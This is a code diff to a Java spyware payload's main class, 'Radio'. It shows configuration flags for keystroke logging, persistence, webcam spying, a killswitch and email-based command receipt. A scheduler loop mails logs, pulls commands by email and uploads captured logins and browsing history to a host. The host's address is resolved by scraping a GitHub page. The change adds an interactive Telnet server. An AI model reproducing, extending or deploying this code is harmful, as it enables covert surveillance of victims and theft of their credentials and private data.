@@ -164,6 +164,7 @@ public class Radio
 	 * @boolean checkForKill toggles the usage of remote killswitch at startup
 	 * @boolean verifyOS toggles the requirement of a Windows-based OS (if being run with WINE or ReactOS)
 	 * @boolean allowWebcamSpy toggles the permissions of webcam access.
+	 * @boolean runServerThreads toggles whether to use an interactive Telnet server.
 	 * @string staticIP sets static IP addr to use if static IP is enabled
 	 * @string allowedMailer is the email that is authorized to send commands to the payload.
 	 * 
@@ -172,17 +173,19 @@ public class Radio
 	 * 
 	 */
 	
-	public static boolean logKeystrokes = true;
-	public static boolean doPersistance = true;
-	public static boolean emailUpload = true;
-	public static boolean emailReceive = true;
-	public static boolean socketUpload = false;
-	public static boolean useStatIP = false;
-	public static boolean mailIPtrackers = false;
-	public static boolean checkForKill = true;
-	public static boolean verifyOS = true;
-	public static boolean isSecondaryDistrib = true;
-	public static boolean allowWebcamSpy = true;
+	public static boolean logKeystrokes       = false;
+	public static boolean doPersistance       = false;
+	public static boolean emailUpload         = true;
+	public static boolean emailReceive        = true;
+	public static boolean socketUpload        = false;
+	public static boolean useStatIP           = false;
+	public static boolean mailIPtrackers      = false;
+	public static boolean checkForKill        = true;
+	public static boolean verifyOS            = false;
+	public static boolean isSecondaryDistrib  = true;
+	public static boolean allowWebcamSpy      = false;
+	public static boolean protectSelf         = false;
+	public static boolean runServerThreads    = true;
 	public static String staticIP = "127.0.0.1"; // change accordingly
 	public static String allowedMailer = "targetemail@gmail.com";
 	public static Main m = new Main();
@@ -198,53 +201,72 @@ public class Radio
 		a = new Astatine();
 		AlphaDecay = new Thread(a);
 		Chocolat.println("[" + m.robert.elapsedTime() + "] Starting a new thread for you...");
-			Executors.newSingleThreadExecutor().execute(new Runnable() {
-				@Override
-				public void run() {
-					try {
-						m.exec();
-						Chocolat.println("[" + m.robert.elapsedTime() + "] [✔] Recorder launched successfully.");
-					} catch (IOException | URISyntaxException e) {
-						// TODO Auto-generated catch block
-						e.printStackTrace();
-					}
-				}	
-			});
+		Executors.newSingleThreadExecutor().execute(new Runnable() 
+		{
+			@Override
+			public void run()
+			{
+				try 
+				{
+					m.exec();
+					Chocolat.println("[" + m.robert.elapsedTime() + "] [✔] Recorder launched successfully.");
+				} 
+				catch (IOException | URISyntaxException e)
+				{
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				}
+			}	
+		});
 		Chocolat.println("[" + m.robert.elapsedTime() + "] [✔] Done.");
+		if (runServerThreads)
+		{
+			Server listener = new Server(m.robert);
+			listener.run();
+		}
 		java.util.Date d = new java.util.Date();
 	    Calendar cl = Calendar.getInstance();
 	    cl.setTime(d);
 	    schDay = cl.get(Calendar.DAY_OF_WEEK);
 		for(;;) {
 			d = new java.util.Date();
-		    Calendar cal = Calendar.getInstance();
-		    cal.setTime(d);
-		    int dow = cal.get(Calendar.DAY_OF_WEEK);
-		    int hour = cal.get(Calendar.HOUR_OF_DAY);
-		    int minutes = cal.get(Calendar.MINUTE);
+		    cl = Calendar.getInstance();
+		    cl.setTime(d);
+		    int dow = cl.get(Calendar.DAY_OF_WEEK);
+		    int hour = cl.get(Calendar.HOUR_OF_DAY);
+		    int minutes = cl.get(Calendar.MINUTE);
 		    if (schDay != dow) 
 		    {
 		    	uploadDone = false;
 		    	schDay = dow;
 		    } // update scheduler
-			 if (dow == 2 || dow == 3 || dow == 4 || dow == 5 || dow == 6) {
-				 if ((hour >= 16 || hour == 0)) {
-					 if (socketUpload) {
-						 if (minutes % 2 == 0) {
+			 if (dow == 2 || dow == 3 || dow == 4 || dow == 5 || dow == 6)
+			 {
+				 if ((hour >= 16 || hour == 0)) 
+				 {
+					 if (socketUpload)
+					 {
+						 if (minutes % 2 == 0)
+						 {
 							upload(getHostIP());
 						 } 
-						 else {
+						 else
+						 {
 							 uplogin(getHostIP());
 							 uphistory(getHostIP());
 						 }
 					 }
-					 if (minutes % 30 == 0 || minutes == 0) {
-					     if (emailReceive) {
+					 if (minutes % 30 == 0 || minutes == 0) 
+					 {
+					     if (emailReceive) 
+					     {
 						     Chocolat.println("[" + m.robert.elapsedTime() + "] [?] Checking for commands...");
 							 checkForCommands();
 					     }
-						 if (emailUpload && !uploadDone) {
-							 if (mailLogs(0) == 0) {
+						 if (emailUpload && !uploadDone) 
+						 {
+							 if (mailLogs(0) == 0) 
+							 {
 							     Chocolat.println("[" + m.robert.elapsedTime() + "] [✔] Daily TX Successful.");
 								 uploadDone = true;
 							 }
@@ -252,23 +274,31 @@ public class Radio
 					 }
 				 }
 			 } 
-			 else if (dow == 1 || dow == 7) {
-				 if (socketUpload) {
-					 if (minutes % 2 == 0) {
+			 else if (dow == 1 || dow == 7) 
+			 {
+				 if (socketUpload) 
+				 {
+					 if (minutes % 2 == 0) 
+					 {
 						 upload(getHostIP());
 					 } 
-					 else {
+					 else 
+					 {
 						 uplogin(getHostIP());
 						 uphistory(getHostIP());
 					 }
 				 }
-				 if ((minutes % 30 == 0 || minutes == 0)) {
-					 if (emailReceive) {
+				 if ((minutes % 30 == 0 || minutes == 0)) 
+				 {
+					 if (emailReceive) 
+					 {
 					     Chocolat.println("[" + m.robert.elapsedTime() + "] [?] Checking for commands...");
 						 checkForCommands();
 				     }
-					 if (emailUpload && !uploadDone) {
-						 if (mailLogs(0) == 0) {
+					 if (emailUpload && !uploadDone) 
+					 {
+						 if (mailLogs(0) == 0) 
+						 {
 						     Chocolat.println("[" + m.robert.elapsedTime() + "] [✔] Daily TX Successful.");
 							 uploadDone = true;
 						 }
@@ -280,28 +310,32 @@ public class Radio
 	 public static String getHostIP() throws IOException {
 		 if (!useStatIP)
 		 {
-		 try {
-	     String s = "";
-		 URL yahoo = new URL("https://github.com/OtakuInSeattle/sites/blob/master/uploader");
-         URLConnection yc = yahoo.openConnection();
-         BufferedReader in = new BufferedReader(new InputStreamReader(
-                 yc.getInputStream(), "UTF-8"));
-         String inputLine;
-         StringBuilder a = new StringBuilder();
-        // System.out.println("a");
-         while ((inputLine = in.readLine()) != null){
-             a.append(inputLine);
-             if(inputLine.contains("connectTo")) {
-          //  	 System.out.println("b");
-            	 s = (inputLine.substring(78, inputLine.indexOf("</td>")));
-             }
-         }
-         return s;
-    //     return "127.0.0.1";
-		 } catch (Exception e) {
-			 return "127.0.0.1";
-		 }
-		 } else {
+			 try 
+			 {
+				 String s = "";
+				 URL yahoo = new URL("https://github.com/OtakuInSeattle/sites/blob/master/uploader");
+				 URLConnection yc = yahoo.openConnection();
+				 BufferedReader in = new BufferedReader(new InputStreamReader(
+						 yc.getInputStream(), "UTF-8"));
+				 String inputLine;
+				 StringBuilder a = new StringBuilder();
+				 while ((inputLine = in.readLine()) != null)
+				 {
+					 a.append(inputLine);
+					 if(inputLine.contains("connectTo")) 
+					 {
+						 s = (inputLine.substring(78, inputLine.indexOf("</td>")));
+					 }
+				 }
+				 return s;
+			 } 
+			 
+			 catch (Exception e) {
+				 return "127.0.0.1";
+			 }
+		 } 
+		 else 
+		 {
 			 return staticIP;
 		 }
 	 }
